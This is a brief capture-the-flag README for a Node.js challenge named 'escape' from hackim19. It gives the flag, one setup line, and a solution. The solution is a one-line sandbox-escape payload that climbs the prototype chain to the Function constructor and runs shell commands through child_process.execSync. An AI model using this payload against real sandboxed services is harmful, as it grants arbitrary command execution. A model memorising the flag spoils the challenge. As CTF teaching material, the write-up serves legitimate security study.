# name: escape

# flag: hackim19{S@ndbox_0_h4cker_1}

# solution

- Object.getOwnPropertyDescriptor(Buffer.from.__lookupGetter__("__proto__").call(Buffer.from),"constructor").value("return+process")().mainModule.require("child_process").execSync("cat+iamnotwhatyouthink").toString()

#Installation
- run ./start.sh
